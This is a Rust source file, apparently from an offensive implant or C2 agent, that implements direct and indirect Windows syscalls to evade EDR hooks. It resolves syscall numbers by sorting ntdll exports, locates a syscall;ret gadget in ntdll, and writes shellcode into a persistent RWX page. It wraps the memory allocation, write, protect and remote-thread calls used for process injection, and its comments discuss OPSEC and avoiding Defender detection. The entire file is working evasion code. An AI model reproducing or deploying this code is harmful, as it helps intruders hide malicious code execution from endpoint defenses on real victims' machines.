// src/agent/syscalls.rs
//
// Direct and indirect syscall wrappers for Windows x64.
//
// Direct syscalls: execute the `syscall` instruction from our own code,
// bypassing any hooks EDR placed on ntdll functions. The syscall number
// is read from the clean ntdll export at runtime.
//
// Indirect syscalls: instead of executing `syscall` from our memory
// (which is detectable via return address inspection), we JMP into the
// legitimate `syscall; ret` gadget inside ntdll.dll. This makes the
// return address point to ntdll, not our unbacked memory.

#[cfg(target_os = "windows")]
pub mod win {
    use std::ffi::{c_void, CString};
    use std::ptr;
    use std::mem;

    extern "system" {
        fn GetModuleHandleA(name: *const i8) -> *mut c_void;
        fn GetProcAddress(module: *mut c_void, name: *const i8) -> *mut c_void;
    }

    /// Extract the syscall number from a native API function in ntdll.
    /// On x64 Windows, Nt* functions in ntdll follow the pattern:
    ///   mov r10, rcx          ; 4C 8B D1
    ///   mov eax, <syscall_no> ; B8 xx xx 00 00
    ///   ...
    ///   syscall               ; 0F 05
    ///   ret                   ; C3
    ///
    /// We read the 4 bytes after the B8 opcode to get the syscall number.
    /// If the function is hooked (JMP at the start), we scan forward to
    /// find the B8 in nearby Nt functions and interpolate.
    pub unsafe fn get_syscall_number(func_name: &str) -> Option<u32> {
        // Cache resolved SSNs to avoid repeated GetModuleHandle/GetProcAddress
        // and memory scanning on every syscall invocation. SSNs are stable for
        // the lifetime of the process (assigned at boot by the kernel).
        use std::sync::Mutex;
        use std::collections::HashMap;
        static SSN_CACHE: std::sync::OnceLock<Mutex<HashMap<String, u32>>> = std::sync::OnceLock::new();

        let cache = SSN_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
        if let Ok(guard) = cache.lock() {
            if let Some(&ssn) = guard.get(func_name) {
                return Some(ssn);
            }
        }

        let result = resolve_ssn_uncached(func_name);

        if let Some(ssn) = result {
            if let Ok(mut guard) = cache.lock() {
                guard.insert(func_name.to_string(), ssn);
            }
        }

        result
    }

    unsafe fn resolve_ssn_uncached(func_name: &str) -> Option<u32> {
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() { return None; }

        let cname = CString::new(func_name).ok()?;
        let func = GetProcAddress(ntdll, cname.as_ptr());
        if func.is_null() { return None; }

        let bytes = std::slice::from_raw_parts(func as *const u8, 32);

        // Fast path: if the function is unhooked, read the SSN directly.
        //   mov r10, rcx   ; 4C 8B D1
        //   mov eax, <SSN> ; B8 xx xx 00 00
        if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1
            && bytes[3] == 0xB8
        {
            return Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]));
        }

        // Function is hooked. Use the export-sort technique (FreshyCalls):
        //
        // Windows assigns SSNs to Nt/Zw functions based on their sorted
        // order by address in ntdll. The lowest-addressed Zw stub gets SSN 0,
        // the next gets SSN 1, etc. This is true regardless of hooks, function
        // spacing, or gaps in the SSN sequence.
        //
        // The old Halo's Gate approach assumed a fixed 0x20 stride and
        // sequential SSNs, which breaks on newer Windows builds with
        // non-uniform function spacing or reordered SSNs.
        resolve_ssn_via_export_sort(ntdll, func)
    }

    /// Walk ntdll's export table, collect all Zw* stubs with their addresses,
    /// sort by address, and return the position of our target function — which
    /// IS its SSN. Works even when all functions are hooked.
    unsafe fn resolve_ssn_via_export_sort(
        ntdll: *mut c_void,
        target_addr: *mut c_void,
    ) -> Option<u32> {
        let base = ntdll as *const u8;

        // Parse PE headers
        let dos = &*(base as *const ImageDosHeader);
        if dos.e_magic != 0x5A4D { return None; }
        let nt_off = dos.e_lfanew as usize;

        // PE signature (4) + FileHeader (20) + offset to OptionalHeader
        let opt_hdr = base.add(nt_off + 4 + 20);
        // Export directory RVA is the first entry in DataDirectory (offset 96
        // into the optional header for PE32+)
        let export_rva = *(opt_hdr.add(112) as *const u32) as usize;
        let export_size = *(opt_hdr.add(116) as *const u32) as usize;
        if export_rva == 0 { return None; }

        #[repr(C)]
        struct ExportDir {
            _characteristics: u32,
            _time_stamp: u32,
            _major: u16,
            _minor: u16,
            _name_rva: u32,
            _ordinal_base: u32,
            num_functions: u32,
            num_names: u32,
            addr_table_rva: u32,
            name_table_rva: u32,
            ordinal_table_rva: u32,
        }

        let export_dir = &*(base.add(export_rva) as *const ExportDir);
        let addr_table = base.add(export_dir.addr_table_rva as usize) as *const u32;
        let name_table = base.add(export_dir.name_table_rva as usize) as *const u32;
        let ord_table = base.add(export_dir.ordinal_table_rva as usize) as *const u16;

        // Collect all Zw* exports with their RVAs (NOT resolved VAs).
        // CRITICAL: We sort by RVA, not by the virtual address that the
        // function's first bytes resolve to. If an EDR patches the function
        // code (inline hook) or even the export address table to redirect
        // to a trampoline at a high address, the resolved VA would be wrong.
        // The export table RVA, combined with .text section bounds filtering,
        // gives the correct original ordering regardless of hooks.

        // Find .text section bounds for validation
        let file_hdr = base.add(nt_off + 4);
        let num_secs = *(file_hdr.add(2) as *const u16);
        let opt_size = *(file_hdr.add(16) as *const u16) as usize;
        let secs_start = nt_off + 4 + 20 + opt_size;
        let mut text_rva_start = 0usize;
        let mut text_rva_end = 0usize;
        for s in 0..num_secs as usize {
            let sec_name = base.add(secs_start + s * 40);
            if *sec_name == b'.' && *sec_name.add(1) == b't' && *sec_name.add(2) == b'e' {
                text_rva_start = *(sec_name.add(12) as *const u32) as usize;
                let text_size = *(sec_name.add(8) as *const u32) as usize;
                text_rva_end = text_rva_start + text_size;
                break;
            }
        }

        let mut zw_rvas: Vec<(usize, usize)> = Vec::with_capacity(512); // (rva, va)
        let mut target_rva: Option<usize> = None;

        for i in 0..export_dir.num_names as usize {
            let name_rva = *name_table.add(i);
            let name_ptr = base.add(name_rva as usize);
            if *name_ptr == b'Z' && *name_ptr.add(1) == b'w' {
                let ordinal = *ord_table.add(i) as usize;
                let func_rva = *addr_table.add(ordinal) as usize;

                // Skip forwarded exports
                if func_rva >= export_rva && func_rva < export_rva + export_size {
                    continue;
                }
                // Skip entries with RVAs outside .text — likely EDR-tampered
                if text_rva_end > 0 && (func_rva < text_rva_start || func_rva >= text_rva_end) {
                    continue;
                }

                let func_addr = base.add(func_rva) as usize;
                zw_rvas.push((func_rva, func_addr));

                if func_addr == target_addr as usize {
                    target_rva = Some(func_rva);
                }
            }
        }

        // If the target wasn't found via Zw*, try to find it by VA match
        // (Nt* and Zw* share the same address)
        let target = target_addr as usize;
        if target_rva.is_none() {
            // Look up the target's RVA directly
            let t_rva = target - base as usize;
            zw_rvas.push((t_rva, target));
            target_rva = Some(t_rva);
        }

        let target_rva = target_rva?;

        // Sort by RVA — position in the sorted list IS the SSN.
        zw_rvas.sort_unstable_by_key(|&(rva, _)| rva);
        zw_rvas.dedup_by_key(|e| e.0);

        zw_rvas.iter().position(|&(rva, _)| rva == target_rva).map(|pos| pos as u32)
    }

    /// Find the `syscall; ret` gadget address inside ntdll.dll's .text section.
    /// Used for indirect syscalls — we JMP here instead of issuing syscall ourselves.
    /// Cached on first call — the gadget address is stable for the process lifetime.
    pub unsafe fn find_syscall_gadget() -> Option<*const u8> {
        // *const u8 is not Send/Sync, so store as usize
        static GADGET: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let addr = *GADGET.get_or_init(|| {
            find_syscall_gadget_uncached().map(|p| p as usize).unwrap_or(0)
        });
        if addr == 0 { None } else { Some(addr as *const u8) }
    }

    unsafe fn find_syscall_gadget_uncached() -> Option<*const u8> {
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() { return None; }

        // Parse PE headers to find .text section
        let dos = &*(ntdll as *const ImageDosHeader);
        if dos.e_magic != 0x5A4D { return None; }

        let nt_offset = dos.e_lfanew as usize;
        let file_header_ptr = (ntdll as *const u8).add(nt_offset + 4);
        let num_sections = *(file_header_ptr.add(2) as *const u16);
        let opt_header_size = *(file_header_ptr.add(16) as *const u16) as usize;
        let sections_start = nt_offset + 4 + 20 + opt_header_size;

        for i in 0..num_sections as usize {
            let sec = &*((ntdll as *const u8).add(sections_start + i * 40) as *const ImageSectionHeader);
            if &sec.name[..5] == b".text" {
                let text_start = (ntdll as *const u8).add(sec.virtual_address as usize);
                let text_size = sec.virtual_size as usize;

                // Scan for the pattern: 0F 05 C3 (syscall; ret)
                for offset in 0..text_size.saturating_sub(3) {
                    let p = text_start.add(offset);
                    if *p == 0x0F && *p.add(1) == 0x05 && *p.add(2) == 0xC3 {
                        return Some(p);
                    }
                }
                break;
            }
        }

        None
    }

    #[repr(C)]
    struct ImageDosHeader { e_magic: u16, _pad: [u8; 58], e_lfanew: i32 }

    #[repr(C)]
    struct ImageSectionHeader {
        name: [u8; 8], virtual_size: u32, virtual_address: u32,
        _size_of_raw_data: u32, _pointer_to_raw_data: u32, _pad: [u8; 12],
        _characteristics: u32,
    }

    // ── Syscall Wrappers ───────────────────────────────────────────────
    //
    // Each wrapper resolves the syscall number at runtime, builds a small
    // shellcode stub, and calls it. For indirect mode, the stub JMPs to
    // the ntdll gadget instead of issuing syscall directly.

    /// NtAllocateVirtualMemory via direct/indirect syscall.
    pub unsafe fn nt_allocate_virtual_memory(
        process: *mut c_void,
        base_addr: *mut *mut c_void,
        zero_bits: usize,
        size: *mut usize,
        alloc_type: u32,
        protect: u32,
        indirect: bool,
    ) -> i32 {
        let ssn = match get_syscall_number("NtAllocateVirtualMemory") {
            Some(n) => n,
            None => return -1,
        };

        // For x64 syscalls with 6+ args, args 5-6 go on the stack.
        // The calling convention for NT syscalls is the same as Windows x64:
        //   rcx = arg1, rdx = arg2, r8 = arg3, r9 = arg4, stack = arg5+
        // But we also need: mov r10, rcx; mov eax, SSN
        //
        // We use inline assembly via a trampoline function.
        syscall_6_args(ssn, indirect,
            process as usize,
            base_addr as usize,
            zero_bits,
            size as usize,
            alloc_type as usize,
            protect as usize,
        )
    }

    /// NtProtectVirtualMemory via direct/indirect syscall.
    pub unsafe fn nt_protect_virtual_memory(
        process: *mut c_void,
        base_addr: *mut *mut c_void,
        size: *mut usize,
        new_protect: u32,
        old_protect: *mut u32,
        indirect: bool,
    ) -> i32 {
        let ssn = match get_syscall_number("NtProtectVirtualMemory") {
            Some(n) => n,
            None => return -1,
        };
        syscall_5_args(ssn, indirect,
            process as usize,
            base_addr as usize,
            size as usize,
            new_protect as usize,
            old_protect as usize,
        )
    }

    /// NtWriteVirtualMemory via direct/indirect syscall.
    pub unsafe fn nt_write_virtual_memory(
        process: *mut c_void,
        base_addr: *mut c_void,
        buffer: *const c_void,
        size: usize,
        bytes_written: *mut usize,
        indirect: bool,
    ) -> i32 {
        let ssn = match get_syscall_number("NtWriteVirtualMemory") {
            Some(n) => n,
            None => return -1,
        };
        syscall_5_args(ssn, indirect,
            process as usize,
            base_addr as usize,
            buffer as usize,
            size,
            bytes_written as usize,
        )
    }

    /// NtCreateThreadEx via direct/indirect syscall (simplified, 4 main args).
    pub unsafe fn nt_create_thread_ex(
        thread_handle: *mut *mut c_void,
        access: u32,
        _obj_attr: *mut c_void,
        process: *mut c_void,
        start_addr: *const c_void,
        parameter: *mut c_void,
        flags: u32,
        indirect: bool,
    ) -> i32 {
        let ssn = match get_syscall_number("NtCreateThreadEx") {
            Some(n) => n,
            None => return -1,
        };
        // NtCreateThreadEx has 11 args total, but the last 4 can be 0
        // Stack layout for args 5-11
        syscall_11_args(ssn, indirect,
            thread_handle as usize,  // rcx
            access as usize,         // rdx
            0,                       // r8 (ObjectAttributes)
            process as usize,        // r9
            start_addr as usize,     // stack[0]
            parameter as usize,      // stack[1]
            flags as usize,          // stack[2]
            0, 0, 0, 0,             // stack[3-6]: ZeroBits, StackSize, MaxStackSize, AttributeList
        )
    }

    // ── Trampoline: execute syscall with N args ────────────────────────
    //
    // These generate a small RWX shellcode stub at runtime that sets up
    // the registers and either executes `syscall` directly or JMPs to
    // the ntdll gadget for indirect mode.
    //
    // This is the pragmatic approach. A production-grade implementation
    // would use inline ASM (nightly Rust) or a pre-compiled ASM object.

    unsafe fn syscall_5_args(ssn: u32, indirect: bool,
        a1: usize, a2: usize, a3: usize, a4: usize, a5: usize,
    ) -> i32 {
        syscall_generic(ssn, indirect, &[a1, a2, a3, a4, a5])
    }

    unsafe fn syscall_6_args(ssn: u32, indirect: bool,
        a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize,
    ) -> i32 {
        syscall_generic(ssn, indirect, &[a1, a2, a3, a4, a5, a6])
    }

    unsafe fn syscall_11_args(ssn: u32, indirect: bool,
        a1: usize, a2: usize, a3: usize, a4: usize,
        a5: usize, a6: usize, a7: usize, a8: usize,
        a9: usize, a10: usize, a11: usize,
    ) -> i32 {
        syscall_generic(ssn, indirect, &[a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11])
    }

    /// Persistent stub page — allocated once, rewritten for each syscall.
    /// Avoids the massive IoC of VirtualAlloc/VirtualFree on every single call,
    /// which heuristic memory scanners flag immediately.
    fn get_stub_page() -> *mut c_void {
        use std::sync::OnceLock;
        static STUB: OnceLock<usize> = OnceLock::new();
        extern "system" {
            fn VirtualAlloc(addr: *mut c_void, size: usize, at: u32, prot: u32) -> *mut c_void;
        }
        const PAGE_SIZE: usize = 4096;
        // Allocate as RWX once at init and never call VirtualProtect again.
        // The old approach flipped RW→RX→RW on EVERY syscall — rapid memory
        // protection toggling on the same page is a classic shellcode indicator
        // that EDRs like Defender for Endpoint aggressively flag.
        const PAGE_EXECUTE_READWRITE: u32 = 0x40;
        *STUB.get_or_init(|| {
            unsafe {
                let p = VirtualAlloc(ptr::null_mut(), PAGE_SIZE, 0x3000, PAGE_EXECUTE_READWRITE);
                p as usize
            }
        }) as *mut c_void
    }

    /// Lock that serializes access to the shared stub page. Without this,
    /// concurrent async tasks would overwrite each other's shellcode mid-
    /// execution, causing an immediate access violation.
    fn stub_lock() -> &'static std::sync::Mutex<()> {
        static LOCK: std::sync::OnceLock<std::sync::Mutex<()>> = std::sync::OnceLock::new();
        LOCK.get_or_init(|| std::sync::Mutex::new(()))
    }

    /// Generic syscall trampoline. Builds shellcode dynamically.
    ///
    /// For direct mode: the stub ends with `syscall; ret`
    /// For indirect mode: the stub ends with `jmp <ntdll_gadget>`
    unsafe fn syscall_generic(ssn: u32, indirect: bool, args: &[usize]) -> i32 {
        extern "system" {
            fn VirtualProtect(addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32;
        }
        const PAGE_READWRITE: u32 = 0x04;
        const PAGE_EXECUTE_READ: u32 = 0x20;

        let stub = get_stub_page();
        if stub.is_null() { return -1; }

        // Acquire exclusive access to the stub page for the entire
        // write → protect → execute → unprotect sequence. If the lock
        // is poisoned (prior panic), recover the guard — the stub page
        // contents are about to be overwritten anyway.
        let _guard = match stub_lock().lock() {
            Ok(g) => g,
            Err(e) => e.into_inner(),
        };

        // Resolve gadget address for indirect mode
        let gadget = if indirect {
            match find_syscall_gadget() {
                Some(g) => g,
                None => {
                    // OPSEC: If the operator explicitly requested indirect syscalls,
                    // silently falling back to direct mode would defeat the evasion
                    // and immediately burn the agent on a monitored endpoint. Fail
                    // hard so the operator knows the technique isn't available.
                    return -1;
                }
            }
        } else {
            ptr::null()
        };

        // Build the shellcode stub
        let mut code: Vec<u8> = Vec::with_capacity(256);

        // Prologue: set up stack frame
        // sub rsp, 0x88 (enough for 11 args + alignment + shadow space)
        code.extend_from_slice(&[0x48, 0x81, 0xEC, 0x88, 0x00, 0x00, 0x00]);

        // Move args into registers and stack
        // arg1 → rcx: mov rcx, <imm64>
        if args.len() > 0 { mov_r64(&mut code, 0x48, 0xB9, args[0]); } // rcx
        // mov r10, rcx (required for syscall convention)
        code.extend_from_slice(&[0x4C, 0x8B, 0xD1]);

        if args.len() > 1 { mov_r64(&mut code, 0x48, 0xBA, args[1]); } // rdx
        if args.len() > 2 { mov_r64(&mut code, 0x49, 0xB8, args[2]); } // r8
        if args.len() > 3 { mov_r64(&mut code, 0x49, 0xB9, args[3]); } // r9

        // Stack args (5th+ go at [RSP + 0x28] per x64 calling convention).
        //
        // INDIRECT MODE ADJUSTMENT: `call r11` pushes an 8-byte return address,
        // decreasing RSP by 8 before the syscall executes. The kernel reads
        // stack args relative to the NEW RSP. Without adjustment, all stack
        // args would be off by one 8-byte slot (the kernel reads uninitialized
        // shadow space instead of our args). We compensate by placing args
        // 8 bytes earlier (at RSP+0x20) so they land at [new_RSP+0x28].
        let stack_base: u8 = if indirect { 0x20 } else { 0x28 };
        for (i, &arg) in args[4..].iter().enumerate() {
            let offset = stack_base + (i * 8) as u8;
            // mov rax, <imm64>; mov [rsp+offset], rax
            mov_r64(&mut code, 0x48, 0xB8, arg);
            code.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, offset]);
        }

        // mov eax, <syscall_number>
        code.push(0xB8);
        code.extend_from_slice(&ssn.to_le_bytes());

        if indirect {
            // Indirect: call ntdll's syscall;ret gadget.
            //
            // CRITICAL: Must use `call r11` (41 FF D3), NOT `jmp r11` (41 FF E3).
            // The gadget is `syscall; ret`. After the kernel returns from syscall,
            // the `ret` pops the return address from RSP. With `jmp`, no return
            // address was pushed — `ret` pops garbage and crashes. With `call`,
            // the return address (our epilogue below) is pushed, so `ret` returns
            // control to our `add rsp, 0x88; ret` cleanup.
            //
            // The indirect syscall's OPSEC goal (the `syscall` instruction's RIP
            // being inside ntdll) is preserved — the kernel sees the instruction
            // pointer within ntdll's .text during the transition.
            let ga = gadget as u64;
            code.extend_from_slice(&[0x49, 0xBB]); // mov r11, imm64
            code.extend_from_slice(&ga.to_le_bytes());
            code.extend_from_slice(&[0x41, 0xFF, 0xD3]); // call r11
        } else {
            // Direct: syscall; ret
            code.extend_from_slice(&[0x0F, 0x05]); // syscall
        }

        // Epilogue
        code.extend_from_slice(&[0x48, 0x81, 0xC4, 0x88, 0x00, 0x00, 0x00]); // add rsp, 0x88
        code.push(0xC3); // ret

        // Write code to the persistent stub page (RWX from init — no VirtualProtect needed)
        ptr::copy_nonoverlapping(code.as_ptr(), stub as *mut u8, code.len());

        type SyscallFn = unsafe extern "C" fn() -> i32;
        let func: SyscallFn = mem::transmute(stub);
        let result = func();

        result
    }

    /// Helper: emit `mov <reg>, <imm64>` into the code buffer.
    fn mov_r64(code: &mut Vec<u8>, rex: u8, opcode: u8, val: usize) {
        code.push(rex);
        code.push(opcode);
        code.extend_from_slice(&(val as u64).to_le_bytes());
    }
}

#[cfg(not(target_os = "windows"))]
pub mod win {
    use std::ffi::c_void;

    pub unsafe fn get_syscall_number(_func_name: &str) -> Option<u32> { None }
    pub unsafe fn find_syscall_gadget() -> Option<*const u8> { None }
    pub unsafe fn nt_allocate_virtual_memory(
        _p: *mut c_void, _b: *mut *mut c_void, _z: usize, _s: *mut usize,
        _a: u32, _pr: u32, _i: bool,
    ) -> i32 { -1 }
    pub unsafe fn nt_protect_virtual_memory(
        _p: *mut c_void, _b: *mut *mut c_void, _s: *mut usize,
        _n: u32, _o: *mut u32, _i: bool,
    ) -> i32 { -1 }
    pub unsafe fn nt_write_virtual_memory(
        _p: *mut c_void, _b: *mut c_void, _buf: *const c_void,
        _s: usize, _w: *mut usize, _i: bool,
    ) -> i32 { -1 }
    pub unsafe fn nt_create_thread_ex(
        _t: *mut *mut c_void, _a: u32, _o: *mut c_void, _p: *mut c_void,
        _s: *const c_void, _pa: *mut c_void, _f: u32, _i: bool,
    ) -> i32 { -1 }
}
